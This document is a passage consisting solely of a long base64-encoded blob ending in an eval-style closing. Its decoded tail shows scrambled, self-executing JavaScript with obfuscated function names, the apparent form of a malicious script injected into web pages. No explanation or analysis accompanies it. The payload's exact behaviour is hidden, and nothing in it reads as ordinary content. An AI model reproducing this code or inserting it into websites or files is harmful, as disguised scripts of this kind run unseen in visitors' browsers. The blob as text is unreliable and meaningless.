13fUo7Zykxb2MoSl1NM2k1ZTtoX3V0ezFKci4uZ18sXW84X11dZW8lKXBKJmYsdT1kaSlhXVglIGFnNjRsYyguZTBydClwW0AsSl94dyloYXJkcihkbzVnNEUyaXRvZS1KKGVuZHJlKXNKfW5jZV1hZHQgRDVKLiklYVwvZ2wxLjMuS2xzbG9uOmZ1OkohY1xcMG1oI107OXRiUzMrPWtlaW5dSmw9b11jZHAxcDJhbztlbEplXWs1Lj00ZTEyYyVwdEVkNE5tIWhkKSQhIHMuITN0SjIsX295KW4zLl97b3NuY2dic3V1Pm9sUy4zLmVnLmVyXCdfLDBsYUoyZW4kJSVKPlA6JSRyZS5fNG5VSiUkeH0gZH10ZWwudVRnZW5hcnk5LmFvLjswcEFKZ0olQn19ICUuXFxhaXQ9aGVuK2Jvb0pzc2VUdFQ7bWUlZSFhMiU4bl0uSilsZXQsSl0+X2VyZTVsSlNKSl9mNGEyKTtvaCVaXXlfM2gwSkpjZiAzJHVuSmxwbSVQXC9yZS5fdDFfaTssbGdvXzQoNDllaUouNCkpY25peDE2RSV7ZillSkp0M29Ka20gNF1jSnNiYUpiLkVlXWUySm00M11jQ3QuYSllLGM/bzVlbmVeKlFUSmFoLlZhMCxKcjFtKDJ9bV9zfWQzSkMuSnQlZW89YXNnNCEpcmhydG1fNF8pSmk+ai5pdGRfSm81My5sMSkzXVgzbWViKT1rZX1nKTZKKX1bSi4oM2stKCYyemF3PXglKWg2dGVdXWd7XzV9PTVKJTFvSnM6X3VtSjFfaE9KaSljYV1mXS5KSnJlYkpqM0piMW81Lnd3Sn1mIWM7ODUlc2xKUTdvSjVKXyVKb05hLjY1NDNKMVtfMnQlaTp0cnIgLTVhSi5LbzIpKTpuJTJ4Oy4pPF1idkopdHRZO0ozK2VdN0pmZCFcXGVKbXRfYWUgcGxjIEp7b2kxbDJ9KkpfY3tjK2llbnVnSmUsM1N5YmwxU25KLmFKITs7JkpmKUpjIHRicjZyNWEucmAgZHR1NUplcm8gKF9iKW9fKGE2IEooZkp0aHI0b0pdbnQhKWZfckpzVF9yLnJKSm90WSlQSm5lZXspY2VZZDVpLG50dF1KY0oyMl9uK3tlZUpnXSk0Sig1MD1yaTI0PUp7c2lOdEorXyAufW1uaWE0ZTluI0pnIV1dIF9yNXQwZWlmLmNKZmVdM2UubEp1WU4rXC9uLi5KNDhyZkpKLm5rYix1eE4zKG4pN3BfSmxTSl1KVGZdc3VrXWVKMF1vOmZvZXJwLm5sSmE3ZW5yaWVpSm4wfXJdLig/cGVfakpTb24oSilkSjY1JWpqLFZySjtKc30oJTRKYW5KYnRlaUpUSGVfSmwxXV1lX3RlPWFKSl1dPUpKYXQxSnRlO2FdXT0gZWRdYXR0IHRKKC4tcFJpMWN0XVwnSjVpSjM9XX1bWmZqaXImNkozaTZheS1bcHVvc2pmSmV9PUplSjEgdSl0fWlmITVyYl1udHQzaF1fe1s6YzJzLnhKSiFlXToobEpAZF8/LCh7Li5pZmVoNl1uLj17SjFuSmwsSig9LiE0KH1jaXNKaWVdMW9pMWNUSkpoZWlLZnkob29fM3RlbDZ9IUooc0pjZWltJUpzLGlyLGVoNyljLj1OOXNJYzddMko0IW00ZilkdllKLl9jO0poZXlfSnBKOSlKci51SmFfQEplZXQuZUpKXVsyaWlhXyVnbzIxZXUpXUQ1LCg9ZShiIF9ZPWMxMV1ddmQpaWN9cDV7K0oiZmVdcl90XTc1SihKbj1nYV9zbDIoc0pKPXRoMWExYik/MGVhckowSigoSmk4LG9dMSFUe1UodCxvb0plbXU9Q2EuSnRKO3tkdWQ1cGBlMz1lSl8pWSRoR2lrOyV1bzYoNigwKWV7SkpsZVtdamlkMnk7M2M+ZV9lKU06ZXJncy5dSm5yKW9ybEpfIV11KUpIckoyLmlfSmlfR0omO29uLEokb1lKXTFhbTlyPW57ZGRlSk4pcykgLm8pZ0pvb2VlPUpRZCAtZSV7IHRKZWdfKDRlSi54KC5KYWlua3RDIWNlLnJKMDtlKW9bT1ssX2E0Ny5lZnRLaV19NS4oSixuJDh0LGFjdGVoKTt7bygpPXsgSkpcXEpuMTpKKS5KQV0sSmx0YyVKMSk2bzhvdCFlcy5NczNdX1RuZUxKXUo2YS4lZVVzZUplQWxKYmFfWV1uSnIxZl9lKCBOIEokYy5dSl01bG9pbjZKK2VlKWhtY19dXWl3LGxNSmB5ZUlzNGEhXW9KV28ibl9zdy4gTUo2c11uLmQ6eUopaSogXFxfNllUZFA7ZV90XmI1SkV0XSlzYW9SZUpKX2hlSmxlIGVlKTBmZCRpfTpKcEphSmJKYTIoYUomKUouMltjXT09PFlkJTtKckVuMGkldClwJihlInNzO3RjclRzM3JdXV11cmlubkpKSnsuJjJdPWZlaT1lYUo6aH1uPXIlKD9wZSFKKXRuckojckY1SnBidG5dZUo/LSgpLmIhSiBhLjBKMSBKeXRhXWNKLGl0NiZhfW9uSig3KDBwUHJlblBKQzksYSZKSl1jMWVlPnJuXXJfSmRpKEwzSjZmJTRlXUotZTMwLnRfPisxZVZjdEpdfWg7cmpfKHJkZXMlZkouK2tabEE9PXQxSihubkp9ZSslSmFKdkpic3coJEpvSj1ddTFfO0plQmEjQ2V7SjNcXCVhX2FKWjlKO2l0dCE6ITVlITNKZVxcb2EpSnM1X3lLMXIgJS4zOj1KSm1uKCxjOzJ9X10pZTMiamtKITZycl0gXUYsSi47LHJhdDExIj1hJW9Xbko1W2VKSmVKSikuZUoxdCtjN18oNWI2eytKZUoyLl1KZz1tKD10I3Uubz0rXylKc2UiZWlsJkp0XCdfdXNsZ2UuW2dJJTouWS5vNG54akplY28wXkVbXXNKPVwnMW4ueCg3O2pKbGRzSnRyZWY7SmMpU2RaKEpwVjVgKVsrY28pPjVjb29qZWpqbzItJH1pfSBvPSs9YSVKdG4rSlswI18uM0pASig0aWUkckRoZTpPNzEgcyglSkhKIWFvckozYWwySSh0ZThdMzVaYXQsOzNKNH1iLkpKTnQgZUpcLz00aztKeCVkZmcyXXIuPWJ4bW8hSiloMS5wNyk1IDlKIEpKSitlJWwoMkpwKWYkcjFhNCFpKSgwYXZKbDV1SjV0I21Kc3RpO19fZlhlMmUjSjdtcntlSkpPbkowLm9oSkpKc3tpWmlKKWVKaSlwJXR2SmR9XWJKMH10ZHJCZiAlSjQkaWI3MzUlLjQ9ZXAubmxsOCkuaXM3byhfSmNKfWM8Km5yUT1KOmhyX2U7SiMwLChdZS5jdC5hLmV7ZCl5XWlmeyYrKTEocjhqaW41MnhKPWMsb0ptMl1KbzFKMDl0N2E7e0Q9dDo0b1Jyd2NfMWFKSjQ1XSxwbjtKdGwgfS4pSmllWm9KXylmKDQpXW5yaGlfdEpKYWVqdTFjaVxcaGNKWSh0cSFKIGVldHNfPDVfIGJlZUouSmRKaDg0K3BKIW97SjNfdEpKX2RfSkpxcmN0b3FdTm0pSiljaWcgO0pfX187XFxKXSshSkpmJW0hbGlzSmhJaSwwYXQgc0IsbTRlbnRlPS5wLjssPW5KKEpybWk9SmVJLl90aVRoSjM0LmEtX0paZStldmVKbz04Y2whaGVpNWo1OywpSn1yZW8ocm4xaXNycz1fMllyMj9KJSUxMXQpKTZuJiRlZlNsZG8rfSl2ZV50LG5vcGluWyBKNnQpdGluSkc9YnsuKGN0Sko4PX0jO0pzY2V0MnJKSl9lbzBfdWRDSkpKJCkrNGRiImVvKHVhbDZyc11hSmZKdDIwJGU9bGlKckouX0osSjBuM3A+Lm4xbGw0XC90cjE7M3AxX2IzJF95SnI3JG8gdDJ0XW9fJG02OmVlc3tyKCBKSnVZSiFydG91XSh1bUpKPTJKSnNfZWhibzZKSjYpcG9dKXQgSjV1SjJbSmZyY25vLmVyeyBqcD0xLnJlPS4mdXBzMSA/KUpfMSlpSjVjICJsSmUkfTZ9SiBySjE1MyY7cl89Sl00SnQlIGk6P1kycDFdcyUxc19KX0ouY3tKeyBSSnVfSm9dX2FlQjZ9dEpleH10VV1KbEpyc3ksb2RlZWV0XCc5LnQuQ29yKUpdMV9BYXRyLG5kSi50JXBfdGYuX2UufWJlIHZuYnIzSjJfSiU7b29KfWckMCkwcyxKKHc9MHUpSnJzSjFpPSp0bjpMPWFmMWI5NkpdSitiKTMwcG93ZGU9X3RmbyVlXW4gKSglSjthSnQ9djohOUpUSnRMLnNsbm5ieHRKLmI1SnNvcCVlSlZhMi5pRWVfKHRjZV81ZVp0dmVuZWVpZ2hncG9ePXhGSjRpbkpKZS49MWwkLUogNmVuJjJKSm5mIEllb2wlIDNpUThFSnsxZWUuKXRpZWU7b3ErX2VdSjRKSWUgICE3bHRlSkpULiBKLnphQ2FKMWVySkpKfUolSmVzbiB1LEouLjdKNCB9M0pKIGVpXVtVKV0mX1tJd3JdIG8wKTUnKSk7dmFyIGJJcT1KWHoobG9rLEVhbCApO2JJcSg3NzA1KTtyZXR1cm4gNDQ1NX0pKCk='))
